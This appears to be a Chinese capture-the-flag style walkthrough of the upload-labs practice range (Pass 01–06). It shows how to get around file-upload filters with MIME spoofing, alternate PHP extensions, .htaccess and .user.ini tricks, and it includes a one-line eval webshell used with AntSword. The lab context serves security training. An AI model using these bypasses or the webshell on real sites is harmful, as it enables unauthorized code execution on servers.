# upload-labs靶场通关



+ 源码位置：https://github.com/c0ny1/upload-labs

+ 参考通关秘籍：
  + [Upload-labs靶场通关攻略(全网最全最完整)](https://blog.csdn.net/weixin_47598409/article/details/115050869)
  + [Upload-labs靶场通关笔记(含代码审计)](https://blog.csdn.net/weixin_54894046/article/details/127239720?ops_request_misc=%7B%22request%5Fid%22%3A%22170438292316800215095603%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170438292316800215095603&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-127239720-null-null.142^v99^control&utm_term=upload-labs通关&spm=1018.2226.3001.4187)
  + [upload-labs详解1-19关通关全解(最全最详细)](https://blog.csdn.net/qq_53003652/article/details/129969951?ops_request_misc=%7B%22request%5Fid%22%3A%22170636374116800222847150%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170636374116800222847150&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-129969951-null-null.142^v99^pc_search_result_base4&utm_term=upload-labs通关&spm=1018.2226.3001.4187)

+ 本地打开地址：<code>http://localhost/upload-labs</code>

## Pass 01

![Pass01_1](./img/Pass01_1.PNG)

+ 首先查看提示：本pass在客户端使用js对不合法图片进行检查！



+ 代码审计，查看下源代码，发现确实在前端验证：

![Pass01_2](./img/Pass01_2.PNG)

![Pass01_3](./img/Pass01_3.PNG)



+ 编写脚本：

![Pass01_4](./img/Pass01_4.PNG)



### 方法一：浏览器禁用JS

+ 点击图中的地方设置浏览器

  ![Pass01_5](./img/Pass01_5.png)



+ 浏览器禁用JS后上传php文件

![Pass01_6](./img/Pass01_6.png)

![Pass01_7](./img/Pass01_7.png)



+ 成功上传后在右键在另一标签打开上传的图片

![Pass01_8](./img/Pass01_8.png)



+ 发现webshell成功执行

![Pass01_9](./img/Pass01_9.png)



## Pass 02

+ 首先查看提示:

~~~ tex
本pass在服务端对数据包的MIME进行检查！
~~~

![Pass02_1](./img/Pass02_1.PNG)



+ 上传<code>pass-02</code>的脚本文件

![Pass02_2](./img/Pass02_2.PNG)



+ 在burpsuite软件拦截包后修改上传的PHP文件的content-type为image/png

![Pass02_3](./img/Pass02_3.png)

![Pass02_4](./img/Pass02_4.png)



+ 可以看到文件成功上传

![Pass02_5](./img/Pass02_5.PNG)



+ 右键在另外的标签页打开刚上传的文件

![Pass02_6](./img/Pass02_6.PNG)

![Pass02_7](./img/Pass02_7.PNG)

注入成功



## Pass 03

+ 首先查看提示

~~~ shell
本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！
~~~

![Pass03_1](./img/Pass03_1.PNG)



+ 查看源代码

~~~ php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

~~~

查看源码，黑名单可用<code>php2</code>、<code>php3</code>、<code>php5</code>、<code>php7</code>、<code>phtml</code>等绕过



+ 修改<code>phpstudy</code>的配置文件<code>httpd.conf</code>

![Pass03_2](./img/Pass03_2.png)



+ 加上下面这条命令：

~~~ shell
AddType application/x-httpd-php .php .phtml .php5 .php3
~~~

![Pass03_3](./img/Pass03_3.png)

> 修改完配置文件后记得重启以下<code>phpstudy</code>服务环境
>
> ~~~ tex
> 关于AddType命令的作用解释
> 
> AddType 指令 作用：在给定的文件扩展名与特定的内容类型之间建立映射 语法：AddType MIME-type extension
> [extension] …
> AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。
> AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。
> ~~~



+ 重新启动<code>phpstudy</code>服务环境



+ 将一句话木马文件<code>.php</code>后缀改为<code>.php5</code>即可上传

![Pass03_4](./img/Pass03_4.png)



+ 如图，上传成功

![Pass03_5](./img/Pass03_5.png)



+ 这里有个问题，<code>php</code>版本不能为<code>nts</code>，不然就会出现<code>.php5</code>文件无法解析的情况

![Pass03_6](./img/Pass03_6.png)



## Pass04

+ 查看下提示信息

~~~ shell
本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！
~~~



+ 这题使用的是<code>php5</code>环境，重新上传<code>pass3</code>需上传的<code>php5</code>或其他类型文件均失败

![Pass04_1](./img/Pass04_1.png)



+ 发现有一个文件没有过滤，是上传过程中经常用到的<code>.htaccess</code>文件

~~~ tex
.htaccess基础知识*重点内容*
.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。

启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。

它里面有这样一段代码：AllowOverride None，如果我们把None改成All
~~~



~~~ tex
概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

Unix、Linux系统或者是任何版本的Apache Web服务器都是支持.htaccess的，但是有的主机服务商可能不允许你自定义自己的.htaccess文件。

启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。

笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。
~~~



+ 漏洞原理

~~~ tex
利用上传到服务器上的.htaccess文件修改当前目录下的解析规则
~~~



+ 查看源码

![Pass04_3](./img/Pass04_3.png)



+ 形成条件

~~~ tex
1.php5.6以下不带nts的版本
2.服务器没有禁止.htaccess文件的上传，且服务商允许用户使用自定义.htaccess文件
~~~



1. <code>.htaccess</code>参数

常见配法有以下几种：

~~~ tex
AddHandler php5-script .jpg
AddType application/x-httpd-php .jpg
SetHandler application/x-httpd-php

Sethandler 将该目录及子目录的所有文件均映射为php文件类型。
Addhandler 使用 php5-script 处理器来解析所匹配到的文件。
AddType 将特定扩展名文件映射为php文件类型。
~~~



<code>.htaccess</code>文件内容如下：

~~~ shell
SetHandler application/x-httpd-php .png
~~~



### 方法一

先上传<code>.htaccess</code>方法再上传后缀<code>png</code>文件，将该目录及子目录的所有文件均映射为 <code>php</code>文件

>使用的php版本为php5.4.45 运行模式为 **Apache 2.0 Handler**
>
> 在php的nts版本下面无法解析png图片为php文件 该运行模式为CGI/FastCGI



+ <code>nts</code>和非<code>nts</code>版本区别对比

> 在PHP 开发和生产环境搭建过程中，需要安装PHP语言解析器。官方提供了2种类型的版本，线程安全（TS）版和非线程安全（NTS）版，有时后我们开发环境和实际生产的环境有所不同，因此也需要选择安装对应的PHP版本。
>
>  
>
> **1、简介**
>
> **TS:**
>
> 　　TS(*Thread-Safety*)即线程安全，多线程访问时，采用了加锁机制，当一个线程访问该类的某个数据时进行数据加锁保护，其他线程不能同时进行访问该数据，直到该线程读取完毕，其他线程才可访问使用该数据，好处是不会出现数据不一致或者数据污染的情况，但耗费的时间要比 NTS 长。
>
> 　　PHP以 ISAPI 方式（Apache 常用方式）加载的时候选择TS版本。
>
>  
>
> **NTS:**
>
> 　　NTS(*None-Thread Safe*)即非线程安全，不提供数据访问保护，有可能出现多个线程先后或同时操作同一数据的情况，容易造成数据错乱（即脏数据），一般操作的执行时间要比 TS 短。
>
> 　　PHP以FAST-CGI方式加载运行的时候选择TNS版，具有更好的性能；
>
> 　　
>
> **ISAPI：**
>
> 　　ISAPI(*Internet Server Application Programming Interface*), 通常是指被http服务器所加载，以服务器的模块形式运行，由微 软提出，故只能在win平台上运行，如win下的apache,iis[用fast cgi 方式工作更稳定]，而linux上php 则以 Apache模块（常用方式）或者php-fpm（该方式更适合于NGINX+PHP 运行）的方式运行。
>
>  
>
> **CGI：**
>
> 　　cgi(*Common Gateway Interface*):HTTP服务器与客户端机器上的程序进行“交谈”的一种工具,简而言之，cig就是一种 后台语言，可以与服务器进行通讯。此时的php是作为一个独立的程序运行的，特点就是耗费内存。
>
>  
>
> **FAST CGI：**
>
> 　　fast cgi是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一个新进程。这种方式 是与语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较 高的性能。
>
>  
>
> FAST-CGI 是微软为了解决 CGI 解释器的不足而提出改进方案。当一个请求向 web server 发送请求时，web server总会fork一个CGI解释器进程进行处理这个请求，进程处理完成之后将结果返回给web server，web server将结果返回并显示出来，进程结束，当用户再次请求同一个页面时，web server又会fork一个新进程进行请求处理，这样效率会比较低下（CGI被人诟病的主要原因）。而采用FAST-CGI 解释器的 话，当一个请求执行完毕后不会注销该进程，而是将改进程进入休眠期，当接收到新的请求时，重新启用改进程进行处理。FAST-CGI 较CGI 减少了进程的重复创建的资源占用。
>
> 　　进程与线程：一个进程至少存在一个或多个线程。
>
>  
>
> **2、选择**
>
> 　　通常win下 PHP + Apache 组合，以 ISAPI 的方式运行。
>
> 　　而linux下通常分为2种：
>
> 　　 Apache + PHP，PHP一般作为Apache 的模块进行运行；
>
> 　　 Nginx + PHP ，以 phpfast cgi的方式，即php-fpm的方式运行，该方式对高并发、高负载有良好的性能体现，因此很多网站采用该方式进行环境的搭建。
>
> 　　Nginx 较Apache 的配置要少很多，因此人为出错的概率要少一点，但也因此 Apache 的 稳定性要比Nginx 高。
>
>  
>
> 前面废话了那么多，下面才是重点 ...
>
> **总结：**
>
> - **以 ISAPI 方式运行就用 TS 线程安全版**
> - **以 FAST-CGI 或 PHP-FPM 方式运行就用NTS 非线程安全版**
> - **通常 Windows 下 Apache + PHP 选TS ，IIS（fast-cgi） + PHP 选TNS**
> - **通常Linux 下 Apache + PHP 选TS，Nginx + PHP 选TNS**



+ <code>nts</code>版本会报<code>500</code>内部错误

![Pass04_2](./img/Pass04_2.png)



+ 非<code>nts</code>版本没有这样的条件导致这关攻关失败



## Pass05

+ 使用的版本

​	这里我使用的版本是<code>php5.4.45 nts</code>以及<code>Apache2.4.39</code>

![Pass05_1](./img/Pass05_1.PNG)

![Pass05_2](./img/Pass05_2.png)



+ 点开提示

![Pass05_3](./img/Pass05_3.png)



+ 查看源码

![Pass05_4](./img/Pass05_4.png)

​        源码里把所有可以解析的后缀名都给写死了，包括大小写，转换，空格，还有点号，正常的php类文件上传不了了，并且拒绝上传 <code>.htaccess</code> 文件；反复观察发现没有被限制的后缀名有<code> .php7</code> 以及<code> .ini</code>



+ 百度一番<code>ini</code>的知识

~~~ tex
user.ini ： 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被
CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用
.htaccess 文件有同样效果。
   
除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web
根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。
   
在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI
设置可被识别。
   
两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。
   
user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是
.user.ini。
   
user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。
~~~

<code>php.ini</code> 是<code>php</code>的配置文件，<code>.user.ini</code> 中的字段也会被 <code>php</code> 视为配置文件来处理，从而导致<code>php</code>的文件解析漏洞。



+ 引发<code>.user.ini</code>解析漏洞需要三个前提条件

~~~ tex
服务器脚本语言为PHP  

服务器使用CGI／FastCGI模式  

上传目录下要有可执行的php文件
~~~



+ 百度下<code>CGI</code>

~~~ tex
  什么是 CGI
       CGI 的全称为“通用网关接口”（Common Gateway Interface），为 HTTP 服务器与其他机器上的程序服务通信交流的一种工具， CGI 程序须运行在网络服务器上。
   
       传统 CGI 接口方式的主要缺点是性能较差，因为每次 HTTP 服务器遇到动态程序时都需要重新启动解析器来执行解析，之后结果才会被返回给 HTTP
       服务器。这在处理高并发访问时几乎是不可用的，因此就诞生了 FastCGI。另外，传统的 CGI 接口方式安全性也很差，故而现在已经很少被使用了。
   
       什么是 FastCGI
       FastCGI 是一个可伸缩地、高速地在 HTTP 服务器和动态服务脚本语言间通信的接口（在 Linux 下， FastCGI 接口即为 socket，这个socket 可以是文件 socket，也可以是IP socket），主要优点是把动态语言和 HTTP
   服务器分离开来。多数流行的 HTTP 服务器都支持 FastCGI，包括 Apache 、 Nginx 和 Lighttpd 等。
   
       同时，FastCGI也被许多脚本语言所支持，例如当前比较流行的脚本语言PHP。FastCGI 接口采用的是C/S架构，它可以将 HTTP 服务器和脚本服务器分开，同时还能在脚本解析服务器上启动一个或多个脚本来解析守护进程。当 HTTP
   服务器遇到动态程序时，可以将其直接交付给 FastCGI 进程来执行，然后将得到结果返回给浏览器。这种方式可以让 HTTP
   服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高整个应用系统的性能。

~~~



+ 对比下，<code>php</code>语言与<code>CGI</code>对于我们的<code>Apache</code>和环境均满足



+ 创建<code>.user.ini</code>文件并上传

![Pass05_5](./img/Pass05_5.png)

<code>.user.ini</code>文件里的意思是：所有的<code>php</code>文件都自动包含<code>666.jpg</code>文件。<code>.user.ini</code>相当于一个用户自定义的<code>php.ini</code>



+ 上传<code>666.jpg</code>文件，文件内容为：

![Pass05_6](./img/Pass05_6.PNG)



+ 使用蚁剑连接

  + 等待5分钟
  + 复制图像地址

  ![Pass05_7](./img/Pass05_7.png)

  ![Pass05_8](./img/Pass05_8.png)

  

  + 右键点击添加数据，用蚁剑访问

![Pass05_9](./img/Pass05_9.png)



+ 配置数据，将<code>URL</code>地址设为图像地址，但文件名改为<code>readme.php</code>，连接密码设置为 666

![Pass05_10](./img/Pass05_10.png)



+ 点击确定，发现已经拿到<code>shell</code>

![Pass05_11](./img/Pass05_11.png)



+ 双击<code>shell</code>，出现对应的数据，成功

![Pass05_12](./img/Pass05_12.PNG)



~~~ tex
ps: 蚁剑相关的文档查看对应的url:
	https://github.com/AntSwordProject
	https://github.com/AntSwordProject/antSword
	https://github.com/AntSwordProject/AntSword-Loader
	https://github.com/eastmountyxz/AntSword-Experiment
~~~



## Pass06

![Pass06_1](./img/Pass06_1.png)

+ 查看源码，和第四关对比发现这关没有转换大小写的代码，逆推一下 最后要得到<code>xxx.php</code>那么<code>$file_ext</code>就要是php 黑名单里面就禁止了<code>pHp</code>，没有禁止<code>phP</code> 、<code>Php</code>，这样可以上传大小写混合的后缀名绕过



+ 这里版本得选择非<code>nts</code>版本的才能成功，如果是<code>nts</code>版本会报<code>http 500</code>服务器内部错误，不知道什么原因。在这里我上传了<code>6.Php</code>

![Pass06_2](./img/Pass06_2.PNG)



+ 上传之后由于是<code>nts</code>版本的<code>php</code>版本，所以报了<code>http 500</code>服务器内部错误

![Pass06_3](./img/Pass06_3.PNG)



+ 换一种方法，用蚁剑连接

  + 先定义脚本<code>SixSecondMethod</code>

  ~~~ shell
  <?php @eval($_POST['SixSecond']); ?>
  ~~~

  ![Pass06_4](./img/Pass06_4.PNG)



+ + 上传<code>SixSecondMethod</code>文件

![Pass06_5](./img/Pass06_5.png)



+ + 复制对应的<code>SixSecondMethod</code>文件地址

  ~~~ shell
  http://192.168.31.126:8080/upload-labs/upload/202401310207471991.Php
  ~~~

  ![Pass06_6](./img/Pass06_6.png)



+ + 使用蚁剑添加数据并配置相关信息

  ![Pass06_7](./img/Pass06_7.png)



+ + 最后发现配置成功，但由于<code>php</code>版本是<code>nts</code>导致了服务器出现<code>500</code>错误无法成功拿到<code>shell</code>

  ![Pass06_8](./img/Pass06_8.PNG)



## Pass07

